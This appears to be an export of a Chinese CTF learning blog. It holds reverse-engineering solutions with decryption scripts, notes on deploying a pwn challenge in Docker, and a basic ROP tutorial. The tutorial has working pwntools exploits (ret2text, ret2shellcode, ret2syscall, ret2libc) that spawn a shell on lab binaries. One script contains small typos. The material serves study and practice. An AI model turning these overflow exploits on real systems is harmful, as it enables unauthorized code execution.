中提取出来，编辑成16个一行\n1111111111111111100000111111011110111011111101111011101100010111101110110101011110111000010101111011111101010111101111110001011110111111101101111011111110110111100001100001000111110111101101011111011110110101100001111011010010111111100001111011111111111111\n\n在check()函数可以发现步法，以及初始位置(1,15)\n\n\n那么接下来就只需要找路了,如果能搞个dfs搜索就好了，，\nimport hashlibmd=hashlib.md5()md.update(&#x27;wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd&#x27;.encode(&#x27;utf-8&#x27;))print(md.hexdigest())\n\n2023&#x2F;11&#x2F;6teaaaax找调用函数\n\n\n比较特别的是修改了key的值，然后是一个简单改动的xtea，复制然后把+改-就差不多了\n2023&#x2F;11&#x2F;7小黄鸭先是查了下壳发现里面有很多文件\n然后扔到binwalk看看是真有很多\n尝试binwalk -e解开发现全是zlib，，\n然后递归解开 binwalk -eW，发现里面有一些pyc，所以应该是py打包成的exe\n用工具拆开：\n\n\n反编译里面的1.py\n比较简单。逻辑是输入一个flag，如果里面的内容是字母就rot13，然后ord+2\n如果不是字母就直接ord+1\n所以逆过程就是先ord-1，把符号数字找出来，剩下字母的再-1，然后解开rot13\n最后把他们拼在一起\n安全编程是鹏城杯2023的题，当时看到是rust以及这个题目感觉很难orz\n之前看过一点rust的内容，给我的感觉就是很安全（）没学完\nida打开之后非常地复杂。从字符串摸到了main函数，很复杂\n标了一下字符串。然后在kali运行了一下，是个猜数游戏\n逻辑应该是程序自动生成一个1-10的数字，用户要输入一个1-10的数字，猜对100次修复encflag输出flag。\n这里学习了一下ida的远程linux调试，感觉这样不用gdb了捏\n步骤是把要运行的elf放到kali的ida文件夹里，然后启动对应的server，然后在ida打开调试\n这道题的话，因为是rust所以代码比较难读，但是程序逻辑比较简单。所以可以在程序的每个跳转点处打断点，然后观察执行顺序，找出来需要的变量和常量\n这里主要是修改了guess_number，改成99，再猜1次就好了。程序把生成的猜数答案放在了eax里（返回值）所以照着猜就好了\n终于学会了远程调试，开熏\n2023&#x2F;11&#x2F;12啊啊啊好几天没做题了。。猛肝了一堆实验。。\nz3test（未）\n\n好像解出了一个错的矩阵。。。\nLet’s Go（未看不懂\nez_chal打开之后发现函数名什么的都没加载出来，看wp得知是被混淆了（很好奇是怎样混淆的，混淆函数应该也在这里面吧）\n然后依照动作标一下名字。\n看到加密的形式是一个魔改的xtea\n密文已经给出了：\n\n\n这里的encode没有被混淆，是64位的整数（动态调试里发现的）\n下面验证flag的时候把encode转换为了_DWORD *双字型，32位无符号整数，所以把这个切割一下。\n这个题目里面这个encode是以小端序的方式存储的\n所以顺序应该是C1……DC…………\n在动调里找到的key：\n\n\n\n\n里面的常量，函数名，delta都被混淆了，都要在动态调试里把真实的值找出来\ndelta&#x3D;0x9E3778B9\n然后就写脚本\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3778B9, sum = delta * num_rounds;    for (int i = 0; i &lt; num_rounds; i++) &#123;        v1 -= v0 ^ ((key[(sum &gt;&gt; 11) &amp; 3]) + sum) ^ (v0 + ((v0 &gt;&gt; 5) ^ (16 * v0)));        sum -= delta;        v0 -= v1 ^ ((key[sum &amp; 3]) + sum) ^ (v1 + ((v1 &gt;&gt; 5) ^ (16 * v1)));    &#125;    v[0] = v0;    v[1] = v1;&#125;int main() &#123;    uint32_t key[4] = &#123;0&#125;;    uint32_t encode[] = &#123;        0xC19EA29C, 0xDC091F87, 0x91F6E33B, 0xF69A5C7A,        0x93529F20, 0x8A5B94E1, 0xF91D069B, 0x23B0E340    &#125;;    unsigned int rounds = 64;    char firstkey[40] = &#123;0&#125;;    memcpy(firstkey, &quot;NewStar!NewStar!&quot;, strlen(&quot;NewStar!NewStar!&quot;));    for (int i = 0; i &lt; strlen(firstkey); i += 4) &#123;        key[i / 4] = *(uint32_t*)(firstkey + i);        printf(&quot;%u\\n&quot;, key[i / 4]);    &#125;    for (int i = 0; i &lt; 8; i += 2) &#123;        decipher(rounds, &amp;encode[i], key);    &#125;    printf(&quot;Decrypted data is: %s \\n&quot;, (char*)encode);    return 0;&#125;\n\n真的，写脚本的时候得看清楚了，这少一点那少一点的。\nSTLSTL是C++的一个标准库\n阅读逻辑比较简单\n但是没搞明白这里的逆过程\n\n\n官方是这样写的，但是没看懂\n\n\n于是看了别的办法发现可以爆破。爆破也是个好办法呢！\n然后学到了不止char存在小端序，int64也有。就是这些大于16位的就会存在小端序。\n八个位是一个字节\n十六个位，两个字节，一个字\nA9 A是高字节，9是低字节\nfrom Crypto.Util.number import long_to_bytesencode=[0x2882D802120E,0x28529A05954,0x486088C03,0xC0FB3B55754,0xC2B9B7F8651,        0xAE83FB054C,0x29ABF6DDCB15,0x10E261FC807,0x2A82FE86D707,0xE0CB79A5706,        0x330560890D06]enc_max=max(encode)enc_min=min(encode)# print(hex(enc_max&gt;&gt;15))# print(hex(enc_min&gt;&gt;15))hex_list=[0]flag=&#x27;&#x27;for v in encode:    for v7 in range(0x90000,0x70000000):        if((v7&lt;&lt;15)^v7)==v:            print(long_to_bytes(v7),hex(v),hex(v7)[2:].zfill(8))            tmp=hex(v7)[2:].zfill(8) # 不足8位补0填充为8位            #print(tmp)            for i in range(len(tmp)-1,0,-2): # 小端序                hex_list.append(int(tmp[i-1:i+1],16)) # 16进制            breakprint(hex_list)for i in range(len(hex_list)-2,0,-1):    hex_list[i]^=hex_list[i+1]for i in hex_list[::-1]:    flag+=chr(i)print(flag)\n\n这里有些注意点\n\nlong_to_byte是把长整型转换为字节码，字节码在密码学算法中用得比较多，这里是用来看足不足一个字节，因为后面要调整顺序。\n\nzfill 是补0\n\nhex(v7)会返回一个十六进制字符串 ，所以需要[2:]去掉0x\n\n\n2023&#x2F;11&#x2F;13浪漫至死不渝做的时候和做完都感觉自己是一条狗被创飞了\n主要是阅读js代码，找到第一组加密函数，是栅栏，把一个明文加密成了一个类似key的字符串在第二组加密中使用  \n\n\n第二组就是简单的加减异或\nencode=[125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99]Text1=&quot;5201314WXHN&quot;Text1=list(Text1)for j in range(18):    if j&lt;14:        encode[j]-=10        encode[j]^=ord(Text1[j%7])    else:        encode[j] -= 99        encode[j] ^= ord(Text1[j-7])print(&#x27;&#x27;.join(chr(code) for code in encode))# FJIAXUEFJIAXUEWXHN\n\n听说Cpp很难感觉有点稀里糊涂做的\n可以直接找到密文\n这是主要的加密逻辑\n\n\n在动态调试里可以发现v18的值为0xA,在text_67 中其实key是多少都无所谓\n\n\n写一下\nv19 = [77, 95, 61, 123, 55, 104, 115, 87, 39, 104, 81, 89,       127, 38, 107, 89, 115, 87, 85, 91, 89, 111, 106, 89,       39,87, 114, 87, 79, 87, 120, 120, 125]print(len(v19))# v+=10  v=v^10-8for i in range(len(v19)):       v19[i]=(v19[i]+10)^10       v19[i]-=10print(&#x27;&#x27;.join(chr(code) for code in v19))# SYCAnma1nG_y0u_maKe_it_1alaIa~~\n\n这里把v19的数组小小改动了一下，不知道那两个负数是什么情况\n2023&#x2F;11&#x2F;14flower or tea去花指令+xtea\n全是E8，nop\n注意如果有特别多的栈指针不平衡，可以大批量还原成数据重新生成函数\n\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;uint32_t enc[]=&#123;    0x9AF9464B,0xC417B89E,0xB217A713,0xC93BA9E8,0x94F3E44E,0xB5CC2AB5,0x4451E42C,0x7A8A289A, 0x53C8D008,0x6E117B49,0x9BFFD794,0x5EFF2DF9,0x17E72531, 0xDFBD9979,0x8F871B3A,0x73E8C5AC,0xB28670A6,0x5AF6A369,0x2CF7DA24,0x347B66AF,0xB9C84D60,0x911E912F,0xBD5A2F9B,0xCB96733A,0xC59968BE,0xA00013E9,0xC12F4EA4,0xDE863A10,0xA0C4D594, 0x4380983C,0x7E2F7648, 0xE54DDC89,0x3F27A690,0xB58D3199,0x604AE517,0x9C903984,0xF4E04481,0x3CF4EDFF,0,0&#125;;void decrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x31415927, sum = delta * num_rounds;    for (i = 0; i &lt; num_rounds; i++) &#123;        sum -= delta;        v0 -= (key[sum &amp; 3] + sum) ^ (v1 + ((v1 &gt;&gt; 5) ^ (16 * v1)));        v1 -= sum ^ (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v0 + ((v0 &gt;&gt; 5) ^ (16 * v0)));    &#125;    v[0] = v0;    v[1] = v1;&#125;int main()&#123;    uint32_t key[4]=&#123;32,27,39,44&#125;;    unsigned int r=54;    char flag[40]=&#123;0&#125;;    for(int i=0;i&lt;40;i+=2)&#123;        decrypt(r,&amp;enc[i],key);//        printf(&quot;%d&quot;,i);    &#125;//    printf(&quot;%s\\n&quot;,(char*)enc);    for(int i=0;i&lt;20;i++)&#123;        flag[i]=(char)enc[2*i];        flag[39-i]=(char)enc[2*i+1];    &#125;    for(int i=0;i&lt;40;i++)&#123;        printf(&quot;%c&quot;,(char)enc[i]);    &#125;    printf(&quot;\\n&quot;);    for(int i=0;i&lt;40;i++)&#123;        printf(&quot;%c&quot;,flag[i]);    &#125;    return 0;&#125;\n\ntea的数据类型基本就是模板，不要尝试用ida中反汇编出来的。。。\n2023&#x2F;11&#x2F;15myself一个smc，但没找着修改代码的函数在哪\n在x32dbg里面把加密函数拉出来了，是个xtea，解密：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;void decrypt(unsigned int num_rounds, uint32_t v[2]) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x61C88647, sum = -delta * num_rounds;    for (i = 0; i &lt; num_rounds; i++) &#123;        v1 -= ((v0 &gt;&gt; 5) + 4) ^ (16 * v0 + 3) ^ (sum + v0);        v0 -= ((v1 &gt;&gt; 5) + 2) ^ (16 * v1 + 2) ^ (sum + v1);        sum += delta;    &#125;    v[0] = v0;    v[1] = v1;&#125;int main()&#123;    unsigned int r=32;    uint32_t enc[] =    &#123;        0xBDBDF9F0, 0xE26194C4, 0x80799125, 0x1F0FC219,        0xEB6A1815, 0x84F572C5, 0x40CC3A85, 0xD2A32ABB    &#125;;    for(int i=0;i&lt;8;i+=2)&#123;        decrypt(r,&amp;enc[i]);    &#125;//    for(int i=0;i&lt;8;i++)&#123;//        printf(&quot;%c&quot;,(char*)enc[i]);//    &#125;    printf(&quot;%s&quot;,(char*)enc);    return 0;&#125;\n\n然后密文是以char存储的，八个一组加密。存储形式要是搞不清楚可以动调的时候看看\n2023&#x2F;11&#x2F;18鹏城杯BabyRe好久之前的比赛题，当时没做出来，看了大佬的wp复习了好多以前的知识\n加密流程很清晰\nflag分成4组，12个一组丢进去32轮加密\n\n\n比赛的时候被这个移位迷惑了，当时不知道这只是ida反汇编出来的一些函数，实际上加密函数里没有。被困在这弄了很久。\n#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void decrypt(unsigned char* data) &#123;\tunsigned int* _data = (unsigned int*) data;\tunsigned int rand_num[32][6];\tsrand(0xDEADC0DE);\tfor (int _ = 0; _ &lt; 32; _++) &#123;\t\tfor (int i = 0; i &lt; 6; i++) &#123;\t\t\trand_num[_][i] = rand();\t\t&#125;\t&#125;\tfor (int _ = 31; _ &gt;= 0; _--) &#123;\t\tunsigned int a = _data[0] &gt;&gt; 7;\t\tunsigned int b = rand_num[_][4] + a;\t\tunsigned int c = (_data[0] &gt;&gt; 15) ^ (_data[0] &lt;&lt; 10) | 3;\t\t_data[2] -= b + (rand_num[_][5] ^ c);\t\ta = _data[2] &gt;&gt; 7;\t\tb = rand_num[_][2] + a;\t\tc = (_data[2] &gt;&gt; 15) ^ (_data[2] &lt;&lt; 10) | 3;\t\t_data[1] -= b + (rand_num[_][3] ^ c);\t\ta = _data[1] &gt;&gt; 7;\t\tb = rand_num[_][0] + a;\t\tc = (_data[1] &gt;&gt; 15) ^ (_data[1] &lt;&lt; 10) | 3;\t\t_data[0] -= b + (rand_num[_][1] ^ c);\t\t\t\tfor (int i = 0; i &lt; 12; i++) &#123;\t\t\tdata[i] = 167 * (data[i] - 66 &amp; 0xFF);\t\t&#125;\t&#125;\t&#125;int main() &#123;\tunsigned char enc[] = &#123;\t\t0x48, 0x4D, 0x3B, 0xA0, 0x27, 0x31, 0x28, 0x54, 0x6D, 0xF1,\t\t0x21, 0x35, 0x18, 0x73, 0x6A, 0x4C, 0x71, 0x3B, 0xBD, 0x98,\t\t0xB6, 0x5A, 0x77, 0x2D, 0x0B, 0x2B, 0xCB, 0x9B, 0xE4, 0x8A,\t\t0x4C, 0xA9, 0x5C, 0x4F, 0x1B, 0xF1, 0x98, 0x3D, 0x30, 0x59,\t\t0x3F, 0x14, 0xFC, 0x7A, 0xF4, 0x64, 0x02, 0x2B, 0x00\t&#125;;\tdecrypt((unsigned char*)enc);\tdecrypt((unsigned char*)enc + 12);\tdecrypt((unsigned char*)enc + 24);\tdecrypt((unsigned char*)enc + 36);\tfor (int i = 0; i &lt; 48; i++) &#123;\t\tprintf(&quot;%c&quot;, enc[i]);\t&#125;\treturn 0;&#125;\n\n这里面有个要注意的地方：\n对于data[i]=23*(data[i]+66)\n逆过程为data[i]167*(data[i]-66&amp;0xff)\n因为加密中运算的时候把类型强制转换成了unsigned _int8 所以是0-255内的，要&amp;0xff。这个167是怎么回事呢？是23*x（mod 255）的乘法逆元。这样子就可以不打表算了。捡起来一点密码学知识…\n回顾起来发现题目真的不难，就是做题的时候被一些细节问题绊住了，还是不够熟练。\n","categories":["CTF"],"tags":["CTF"]},{"title":"搭建远程pwn环境和ubuntu无法gitclone的问题","url":"/2024/02/01/%E6%90%AD%E5%BB%BA%E8%BF%9C%E7%A8%8Bpwn%E7%8E%AF%E5%A2%83%E5%92%8Cubuntu%E6%97%A0%E6%B3%95gitclone%E7%9A%84%E9%97%AE%E9%A2%98/","content":"git和复制粘贴的问题\n如果无法访问github怎么办（ping不通）\n修改/etc/hosts\n添加dns解析\n如\n140.82.113.4 github.com146.75.77.194 github.global.ssl.fastly.net\n\n可以访问github了但是clone很慢\n使用gitclone，这是一个提供下载缓存的代码下载网站\n比如我要clone ctf-_xinetd,但是一直卡在这里\n\n\n那么可以尝试换成https传输，从gitclone下载\ngit clone https://gitclone.com/github.com/Eadom/ctf_xinetd.git\n\nubuntu 22.04的open-vm-tools-desktop有点抽象。不能直接拖拽但是可以复制粘贴文件。\n经过资料查询，才发现open-vm-tools有两个组件：open-vm-tools 以及open-vm-tools-desktop。两者区分如下：\n核心 open-vm-tools 软件包中包含核心 open-vm-tools 用户空间实用程序、应用程序和库（包括 vmtoolsd），以帮助有效管理您的主机与客户机操作系统之间的通信。此软件包中包含的功能如下：将客户机操作系统时钟与虚拟化平台同步、在主机与客户机之间传输文件、将检测信号信息从客户机操作系统发送到虚拟化基础架构以支持 vSphere High Availability (HA)、将客户机操作系统的资源利用率和网络连接信息发布到虚拟化平台等。\nopen-vm-tools-desktop 软件包是可选的，其中包含的附加用户程序和库可增强虚拟机桌面操作的交互式功能。安装该软件包后，您将能够调整客户机显示屏幕的大小以匹配其主机控制台窗口或适用于 vSphere 的 VMware Remote Console 窗口。该软件包还允许您在主机与客户机操作系统之间进行复制和粘贴，以及在客户机与适用于 VMware Workstation 和 VMware Fusion 产品的主机之间进行拖放。参考了https://blog.csdn.net/as3luyuan123/article/details/121626106\n想在主机和虚拟机之间复制粘贴要先卸载之前的open-vm-tools\nsudo apt-get autoremove open-vm-toolssudo apt-get install open-vm-tools-desktopsudo reboot\n\n遇到这种和网络环境有关的问题，搜索时可以把时间限定在近期，远古的解决方案在今天大概率没用。\n配置ctf-xinetdgitclone好ctf-xinetd就可以开始啦。\n这里是因为要练习BROP，复现一个没有二进制文件的题目所以被迫学习搭建远程环境了。\n题目的附件来自https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop\n题目的elf文件放到bin文件夹下（如果有libc也要一起放），修改一下flag\n\n\n在ctf-xinetd同级目录下创建docker-compose.yml文件\n\n\n内容为：\nversion: &#x27;3&#x27;services:    wiki_brop:        build: ./        image: wiki_brop        ports:            - &quot;60001:9999&quot;        pids_limit: 1024        # cpus: 0.5        restart: unless-stopped        # privileged: true\n\n这里image的名字要和后面创建的docker image的名字一样\n然后打开ctf.xinetd文件，把这个地方改成bin文件夹种放的elf文件的名字\n\n\n打开Dockerfile文件，把虚拟机版本改一下。如果虚拟机版本高于18的话把下面那个红框的命令删除\n\n\n然后在ctf_xinetd目录下运行：\nsudo docker build -t &quot;wiki_brop&quot; .\n\n注意：sudo、末尾有一个空格和一个点\n\n\n没什么问题的话应该是类似上面这样的\nsudo docker run -d -p &quot;ip:8888:9999&quot; -h &quot;wiki_brop&quot; --name=&quot;wiki_brop&quot; wiki_brop\n\n-p后面的内容是将9999端口映射到8888端口，端口号可以改。\n-name是指定容器名称，-h是指定容器的hostname，最后是image的名字，要和前面创建的镜像的名字一样。\n这里是手动映射了端口，但其实直接使用docker-compose文件映射端口也可以。\n然后就发现docker已经成功运行了，题目部署完毕。\n\n\n如果你希望在一台虚拟机上部署这个题目，然后在其他虚拟机&#x2F;主机连接，上面ip的地方务必填写虚拟机ip，而不是127.0.0.1或者0.0.0.0，这样只能在部署的虚拟机上连接题目…\n在exp中可以写：\np=remote(&quot;ip&quot;,port) # port是映射后的端口，这里是8888\n\n在其他机器上nc连接：\n\n\n简单点：\n\n\n停掉容器之后再重启容器好像有点问题，总是nc连接不上。reboot一下虚拟机偶尔有效（有时没用）\ndocker的基础指令(sudo或者root)\n# 查看帮助docker --help (或者准确点 docker [command] --help)# (!以下命令若显示权限不够的，请自行添加sudo)# 查看docker的基本信息，有多少个容器、镜像等等docker info# 查看本机上的所有镜像docker images# 容器构建docker build# 运行容器docker run# 停止容器docker stop# 强制停止容器docker kill# 删除容器docker rm\n\n进程相关# 查看端口连接：sudo netstat -antp | grep docker# 查看连接所在进程：sudo lsof -i:[端口号]# 断开连接：sudo kill -9 [PID]\n\n编译的相关参数# NX保护机制：-z execstack / -z noexecstack  # (关闭 / 开启) 堆栈不可执行# Canary：(关闭 / 开启 / 全开启) 栈里插入cookie信息# !开canary好像会造成栈中局部变量的顺序有所改变-fno-stack-protector /-fstack-protector / -fstack-protector-all # ASLR和PIE：-no-pie / -pie   # (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk# RELRO：-z norelro / -z lazy / -z now   # (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限-s   # 去除符号表\n\n#程序需要输出输入时，加上这两段代码，不然部署在docker中运行时要回车才有输出setvbuf(stdout, 0, 2, 0);setvbuf(stdin, 0, 2, 0);\n\n\n\n部署多题可使用https://github.com/giantbranch/pwn_deploy_chroot\nhttps://bbs.kanxue.com/thread-275212.htm\n","categories":["CTF"],"tags":["环境"]},{"title":"基本ROP","url":"/2024/01/28/%E5%9F%BA%E6%9C%ACROP-1/","content":"ret2text\n\n32位程序。开了NX，栈不可执行\nida中查看可知使用了gets函数，存在栈溢出漏洞。在secure函数中存在调用system(“&#x2F;bin&#x2F;sh”)的代码。地址为0x804863a\n找偏移量\n\n\n断在了0x62616164,也就是baad\n\n\n\n找到偏移量为112\npayload:\nfrom pwn import *p=process(&#x27;./ret2text&#x27;)p.sendline(b&#x27;a&#x27;*112+p32(0x804863a))p.interactive()\n\nret2shellcode\n\n没开NX，可以在栈中执行shellcode\n最后一行可以看到有可读可执行的段\n\n\n程序gets s，复制到buf2，可以在ida中看到buf2在bss段，地址为0x0804A080\n\n\n运行程序，查看一下这一个bss段是否可执行\nb mainrvmmap\n\n这个题目好像有点问题，正常应该和wiki中的一样查出来是rwx，但是我查到的buf2所在的bss段权限为rw-，但是思路是没啥问题的\nfrom pwn import *p = process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080p.sendline(shellcode.ljust(112, b&#x27;A&#x27;) + p32(buf2_addr))p.interactive()\n\nret2syscall\n\n32位，开了NX\n\n\ngets()，存在栈溢出漏洞\n这里我们使用文件里的gadget来构造一个系统调用。\n构造：\nexecve(&quot;/bin/sh&quot;,NULL,NULL)\n\n程序是32位，通过gadget我们要设置寄存器的值：\n\n系统调用号，eax&#x3D;0xb\n第一个参数，ebx为指向&#x2F;bin&#x2F;sh的地址，或者执行sh的地址\n第二个参数，ecx&#x3D;0\n第三个参数，edx&#x3D;0\n\n寻找gadgets\nROPgadget --binary ./ret2syscall --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;\n\n\n\n使用pop eax ; ret，记录地址0x080bb196\n下面找包含ebx的\nROPgadget --binary ./ret2syscall --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;\n\n\n\n有很多，正好有一条pop edx ; pop ecx ; pop ebx ; ret，可以一下控制3个寄存器，记录地址0x0806eb90\n/bin/sh的地址，0x080be408\n\n\nint 0x80的地址，0x08049421\n\n\n然后查看一下偏移（32位的程序我一般使用gdb的插件gef，和wiki里一样）\ngdb ret2syscallpattern create 200r\n\n\n\n断在了baad这里\n\n\n偏移量为112\npayload：\nfrom pwn import *p=process(&#x27;/home/cake/Documents/pwn/wiki/ret2syscall&#x27;)pop_eax_ret=0x080bb196pop_edx_ecx_ebx_ret=0x0806eb901int_0x80=0x08049421binsh=0x080be408payload=flat([b&#x27;a&#x27;*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,binsh,int_0x80])p.sendline(payload)p.interactive()1\n\nret2libc1\n\n32位，NX，在栈中的数据没有执行权限\n\n\ngets(),栈溢出\n可以看到存在system函数\n\n\n也存在/bin/sh\n\n\npayload:\nfrom pwn import *p = process(&quot;./ret2libc1&quot;)binsh_addr = 0x08048720system_plt = 0x08048460payload = flat([&quot;a&quot; * 112, system_plt, &quot;b&quot; * 4, binsh_addr])p.sendline(payload)p.interactive()\n\n&quot;b&quot;*4是填充在system的返回值处，因为不需要返回，所以随便设置了。\nret2libc2\n\n32，NX\n\n\ngets(),栈溢出漏洞\n和ret2libc1一样存在system的plt，地址为0x08048490\nobjdump -d ret2libc2 | grep &quot;plt&quot;\n\n\n\n\n\n但是没有/bin/sh的字符串了,可以栈溢出后利用gets函数读取它。\n观察到bss端有一个buf2，0x804A080\n\n\n使用vmmap可以发现这个bss段是可写的\n\n\n测偏移的方法和上面一样，测出来的112\n所以思路是，先进行栈溢出，把gets的plt填在返回地址上，然后程序会调用gets，这时输入/bin/sh，在gets的plt后面写上system的plt，gets的内容存储到的地址buf2，调用system，把buf2的地址填上作为system的参数\n可以参考：https://blog.csdn.net/AcSuccess/article/details/104321534\n\n\npayload:\nfrom pwn import*context(os=&quot;linux&quot;, arch=&quot;x86&quot;, log_level=&quot;debug&quot;)p=process(&#x27;/home/cake/Documents/pwn/wiki/ret2libc2&#x27;)gets_plt=0x08048460system_plt=0x08048490buf2=0x804A080payload=b&#x27;a&#x27;*112+p32(gets_plt)+p32(system_plt)+p32(buf2)+p32(buf2)p.sendlineafter(&#x27;What do you think ?&#x27;,payload)p.sendline(b&#x27;/bin/sh&#x27;)p.interactive()\n\nret2libc3\n\n\n\n一样的栈溢出，但是这一次找不到system也找不到&#x2F;bin&#x2F;sh了\nsystem函数属于libc库，程序调用函数使用动态链接libc.so，其中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是对于地址中间位进行随机，最低的12bit（3位十六进制数字）不会改变。\n因此可以泄露libc的某个函数的got表地址，来得到库的版本，从而调用其他函数。\n由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。\n查看重定位节（-R）\n\n\n\n\n在ida找到了puts的plt地址，0x08048460\n也可以用objdump -d ret2libc3 | grep &#39;plt&#39;查找plt表地址\n\n\n因此我们可以利用puts来打印__libc_start_main函数的got表地址。同时在ida得知__libc_start_main函数的地址为0x0804a024\nputs函数的返回地址是_start函数（或者main函数）（start函数\n\n\n_start函数地址为0x080484D0\n偏移测试为112\n但是因为一些原因，libc的版本没有找到…所以这个题先放在这了\n","categories":["CTF"],"tags":["pwn"]},{"title":"The MOVAPS issue","url":"/2024/01/29/%E6%A0%88%E5%AF%B9%E9%BD%90%E9%97%AE%E9%A2%98/","content":"The MOVAPS issue在做一道ret2libc的时候被这个问题困住了好久\n为什么使用下面这个payload程序会崩溃，但是逻辑没有问题呀！\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,system_addr,main_addr),)\n\n使用这个在system前加了一个ret的payload就可以了？！\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),)\n\n经过大佬指点了解到在Ubuntu18版本及以上（还有一部分的Ubuntu16版本）64位程序调用system时是需要栈对齐的。\n根本原因是64位的system命令有个movaps指令，这条指令是：\nmovaps xmmword ptr [rsp + 0x50], xmm0\n\n从 https://www.felixcloutier.com/x86/movaps 处我们可以知道，这条指令的功能是： 将xmm0中保存的单精度浮点数从xmm0移动至地址[rsp + 0x50]处 。\n当然，更重要的是这条指令的执行条件，这直接关系到程序报错的原因。原文中对执行条件的描述如下：\n\nWhen the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated.\n\n此时报错的原因就显而易见了：当内存地址作为操作数时，内存地址必须对齐 16Byte 、 32Byte 或 64Byte 。这里所说的对齐 xByte，就是指地址必须是 x 的倍数。\n这时又出现了一个问题：到底是对齐多少字节呢？我们可以找到这样一段描述：\n\nThis instruction can be used to load an XMM, YMM or ZMM register from an 128-bit, 256-bit or 512-bit memory location, to store the contents of an XMM, YMM or ZMM register into a 128-bit, 256-bit or 512-bit memory location, or to move data between two XMM, two YMM or two ZMM registers.\n\n基于此，我们可以推测：使用 XMM 时，需要 16Byte 对齐；使用 YMM 时，需要 32Byte 对齐；使用 ZMM 时，需要 64Byte 对齐。\n而此处出错的指令使用了 XMM 寄存器，因此我们需要确保在执行这一指令时，rsp + 0x50 是 16 的倍数。直观地说，就是该地址必须以数字 0 结尾。\n(调用printf时也需要对齐)\n目前了解到有两种办法可以解决这个问题（但也不是每次都行，实在不行就换成execve吧…\n第一种办法：在system前加个ret\n第二种办法：在system的地址上加1-16，尝试，这是为了跳过一个栈操作\n参考：\nhttps://zhuanlan.zhihu.com/p/611961995\n","categories":["CTF"],"tags":["pwn"]}]